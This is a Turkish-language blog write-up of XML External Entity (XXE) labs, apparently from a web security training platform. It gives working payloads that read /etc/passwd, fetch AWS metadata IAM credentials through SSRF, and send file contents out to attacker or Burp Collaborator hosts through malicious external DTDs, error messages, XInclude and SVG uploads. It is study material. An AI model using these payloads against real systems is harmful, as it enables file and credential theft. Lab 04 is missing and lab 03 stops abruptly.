## Introduction

XXE (XML External Entity), XML verisini işleyen uygulamalarda görülen zafiyettir. Bu zafiyet XML parserin kullanıcıdan gelen CML içindeki harici dosya veya URL tanımlarına güvenerek işlemesinden kaynaklanır. 

Normalde XML yalnızca verir taşır:

```bash
<user>
    <name>Neslihan</name>
</user>
```

Saldırgan bu XML’in içine xxe adında bir değişken oluşturabilir ve değeri olarakta sunucudaki dosyaları çağırmayı deneyebilir: 

```bash
<!DOCTYPE user [
    <!ENTITY xxe SYSTEM "file:///etc/passwd"> → dosya
]>

<user>
    <name>&xxe;</name> → değişken
</user>
```

Parser bu komutu çalıştırır ve &xxe; gördüğü yere dosyanın içeriğini yerleştirir. Saldırgan aslında sunucuya bana bu dosyayı oku demiş olur ve parser de bunu gerçekleştirir. 

### Blind XXE

XXE açığını bulunduğu ancak uygulamanın bana doğrudan çıktı vermediği durumdur. Aynı payload gönderilir ama response olarak sadece mesaj düşer. Örneğin *Stock updated successfully.* ****veya *****200 OK* gibi. Yani /etc/passwd okunmuş olsa bile çıktıyı görünmez.

Açığı doğrulamak için, dosyayı ekrana yazdırmak yerine sunucunun bana istek atmasını sağlarım.

```bash
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "http://attacker.com">  → kendi sunucum
]>

<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

Kendi sunucumda veya burp collaboratorda istek görürsem, XXE’in çalıştığını doğrulamış olurum.

```bash
GET / HTTP/1.1
Host: attacker.com
```

### DTD nedir?

DTD (Document Type Definition), XML'e kurallar ve tanımlar eklemek için kullanılan bir yapıdır.

Normal bir XML şöyle görünür:

```
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Ama XML'in başına bir DTD eklediğimizde:

```
<!DOCTYPE stockCheck [

]>

<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

Parser XML’İ okumadan önce DTD bloğunu okur. Bu yüzden XXE saldırıları genellikle DTD içinde yapılır.

Bazen dışarıdan DTD indirilmediğinde, bu engellendiğinde local DTD kullanılır. Sunuculardan bazen işletim sistemiyle birlikte gelen DTD dosyaları bulunur.

- /usr/share/yelp/dtd/docbookx.dtd
- /usr/share/xml/docbook/xml-dtd-4.5/docbookx.dtd   gibi. Parser bu dosyalara erişebilir.

### Error-Based XXE

Error-based XXE, XML parser'ın oluşturduğu hata mesajlarını kullanarak hassas verileri elde etme yöntemidir.

Normal XXE'de parser dosyanın içeriğini doğrudan döndürür. Ancak bazı uygulamalar bunu engeller. Böyle durumlarda saldırgan, parser'ın hata mesajlarını kullanarak veriyi sızdırmaya çalışır.

Diyelim ki sunucuda şu dosya var:

```
/etc/passwd
```

Normalde uygulama bu dosyanın içeriğini bana göstermiyor. Bu yüzden parser’a önce /etc/passwd dosyasını okutup sonra dosya içeriğini kullanarak var olmayan bir dosyaya eriştirmeye çalışılır.

Bu durumda hassas veri uygulamanın normal cevabından değil, parser'ın oluşturduğu hata mesajından elde edilir.

### XInclude nedir?

XInclude, bir XML belgesinin içine başka bir dosya veya XML belgesi eklemeye yarayan XML özelliğidir. Yani parser'a git şu dosyayı al ve buraya ekle demenin yoludur.

## Labs

### **01. Exploiting XXE using external entities to retrieve files**

Ürün stoğunu kontrol etmek için gönderilen isteği Burp Suite ile yakaladığımda, uygulamanın XML formatında veri kabul ettiğini görüyorum.

<img src="/assets/posts/xxe/image.png" width="700" >

Bu istekte, `xxe` adında bir **external entity** tanımlayıp değerini `file:///etc/passwd` olarak belirliyorum. Daha sonra `&xxe;` ifadesini XML içine eklediğimde, XML parser bu entity'yi çözümler ve sunucudaki `/etc/passwd` dosyasını okuyarak içeriğini `&xxe;` yerine yerleştirir.

<img src="/assets/posts/xxe/image (1).png" width="700" >

- Injection

```bash
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck>
   <productId>
      &xxe;
   </productId>
   <storeId>
        1 
    </storeId>
 </stockCheck>
```

### **02. Exploiting XXE to perform SSRF attacks**

Yine ürün stoğunu kontrol etmek için gönderilen isteği Burp Suite ile yakaladığımda, uygulamanın XML formatında veri kabul ettiğini görüyorum.

<img src="/assets/posts/xxe/image (2).png" width="700" >

Bu lab'da amaç, XXE kullanarak sunucunun iç ağdaki bir adrese HTTP isteği göndermesini (SSRF) sağlamaktır. Önceki labdan farklı olarak bu kez SYSTEM ifadesi bir dosyayı değil, `http://169.254.169.254` adresini hedef alır. XML parser bu URL'yi işlediğinde isteği kendi bulunduğu sunucudan gönderir ve dönen cevabı uygulamaya iletir. Bu sayede normalde dışarıdan erişilemeyen AWS Metadata Service'e erişilerek IAM rolüne ait geçici kimlik bilgileri elde edilebilir.

<img src="/assets/posts/xxe/image (3).png" width="700" >

- Injection

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>

<stockCheck>
    <productId>
        &xxe;
    </productId>
    <storeId>
       1
    </storeId>
</stockCheck>
```

### **03. Blind XXE with out-of-band interaction**

Yine ürün stoğunu kontrol etmek için gönderilen isteği Burp Suite ile yakaladığımda, uygulamanın XML formatında veri kabul ettiğini görüyorum.

<img src="/assets/posts/xxe/image (4).png" width="700" >

Bu lab'da uygulama XXE payload'ını işlese bile herhangi bir çıktı döndürmediği için **Blind XXE** söz konusudur. Bu nedenle dosya okumak yerine `SYSTEM` ile Burp Collaborator adresini hedef gösteriyorum.

<img src="/assets/posts/xxe/image (5).png" width="700" >

- Injection

```bash
<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM 
   "http://k7s0w0smzzthwvnf7hv6l4mkqbw2ks8h.oastify.com"> ]>
   <stockCheck>
       <productId> 
          &xxe;
       </productId>
       <storeId>
           1
       </storeId>
    </stockCheck>
```

XML parser bu adresi işlediğinde sunucu Burp Collaborator'a bir DNS/HTTP isteği gönderiyor ve bu istek, XXE açığının başarıyla çalıştığını doğrulamamı sağlıyor.

Bu nedenle saldırıyı **parameter entity (`%`)** kullanarak gerçekleştiriyorum.

<img src="/assets/posts/xxe/image (8).png" width="700" >

### **05. Exploiting blind XXE to exfiltrate data using a malicious external DTD**

Bu lab'da öncelikle **malicious (zararlı) bir external DTD** dosyası (`exploit.dtd`) hazırlıyorum. Bu DTD dosyası, sunucudaki `/etc/passwd` dosyasını okuyup içeriğini Burp Collaborator adresine gönderecek şekilde yapılandırılıyor.

<img src="/assets/posts/xxe/image (9).png" width="700" >

- Payload

```bash
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

Daha sonra hazırladığım `exploit.dtd` dosyasının URL'sini, ürün stoğunu kontrol etmek için gönderilen XML isteğindeki `DOCTYPE` tanımına ekleyerek isteği gönderiyorum. XML parser önce bu harici DTD dosyasını indiriyor, ardından DTD içindeki komutları çalıştırarak `/etc/passwd` dosyasını okuyor ve içeriğini Burp Collaborator'a gönderiyor.


<img src="/assets/posts/xxe/image (10).png" width="700" >

- Injection

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ENTITY % xxe SYSTEM "https://exploit-0a450050033f13d783fc9c3c01e200f6.exploit-server.net/exploit.dtd"> %xxe;]>
       <stockCheck>
            <productId>
                1
            </productId>
            <storeId>
                1
            </storeId>
        </stockCheck>
```

Son olarak Burp Collaborator'ı kontrol ettiğimde, gönderilen isteğin içerisinde `/etc/passwd` dosyasının içeriğinin yer aldığını görüyorum.


<img src="/assets/posts/xxe/image (11).png" width="700" >


### **06. Exploiting blind XXE to retrieve data via error messages**

Öncelikle Exploit Server üzerinde bir **`exploit.dtd`** dosyası hazırlıyorum. Bu DTD dosyası, sunucudaki `/etc/passwd` dosyasını okuyup dosya içeriğini var olmayan bir dosya yoluna ekleyerek XML parser'ın hata mesajı üretmesini sağlıyor.

- Payload
```bash
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

<img src="/assets/posts/xxe/image (12).png" width="700" >

Daha sonra hazırladığım `exploit.dtd` dosyasının URL'sini ürün stoğunu kontrol etmek için gönderilen XML isteğinin `DOCTYPE` tanımına ekleyerek isteği gönderiyorum. XML parser harici DTD dosyasını indiriyor, içindeki payload'ı çalıştırıyor ve oluşan hata mesajının içerisinde `/etc/passwd` dosyasının içeriği yer alıyor.

<img src="/assets/posts/xxe/image (13).png" width="700" >

### **07. Exploiting XInclude to retrieve files**

Bu lab'da önceki XXE lablarından farklı olarak istek XML formatında değil, **form verisi (`application/x-www-form-urlencoded`)** olarak gönderiliyor.

<img src="/assets/posts/xxe/image (14).png" width="700" >

Uygulamanın arka planda XML kullanıp kullanmadığını anlamak için `productId` parametresine basit bir XML payload'ı gönderiyorum.

- Payload

```bash
productId=<test>1</test>&storeId=1
```

Uygulamadan dönen XML parse hatası, gönderdiğim verinin sunucu tarafında bir XML belgesinin içerisine yerleştirildiğini gösteriyor. Bu sayede klasik XXE kullanamasam da, XML'in bir parçasını kontrol edebildiğimi anlıyorum.

<img src="/assets/posts/xxe/image (15).png" width="700" >

Ardından `productId` parametresine **XInclude** payload'ını ekleyerek XML parser'ın `file:///etc/passwd` dosyasını okumasını sağlıyor ve kullanıcı bilgilerini elde ediyorum.

<img src="/assets/posts/xxe/image (16).png" width="700" >

- Injection

```bash
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
&storeId=1
```

### **08. Exploiting XXE via image file upload**

Bu lab'da uygulamanın **SVG formatında avatar yüklemeye izin verdiğini** görüyorum. SVG dosyaları XML tabanlı olduğu için içerisine XXE payload'ı ekleyerek XML parser'ın sunucudaki dosyaları okumasını sağlayabiliyorum.

<img src="/assets/posts/xxe/image (17).png" width="700" >

Hazırladığım XXE içeren SVG dosyasını yorum eklerken avatar olarak yüklüyor ve isteği gönderiyorum.

```bash
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
    <text x="0" y="16">&xxe;</text>
</svg>
```

<img src="/assets/posts/xxe/image (18).png" width="700" >


<img src="/assets/posts/xxe/image (19).png" width="700" >

Yorum başarıyla oluşturulduktan sonra sayfa kaynağını görüntülediğimde yüklediğim SVG dosyasının kullanıldığını görüyorum. Avatar görüntülenirken XML parser payload'ı işlediği için `/etc/hostname` dosyasının içeriği SVG içerisine eklenmiş oluyor.

### **09. Exploiting XXE to retrieve data by repurposing a local DTD**

Bu labda, sunucuda bulunan yerel bir DTD dosyası kullanılarak XML parser'ın hata mesajı oluşturması sağlanıyor. Hata mesajı içerisine yerleştirilen `/etc/passwd` dosyasının içeriği sayesinde hassas veriler elde ediliyor.

<img src="/assets/posts/xxe/image (21).png" width="700" >

- Injection

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
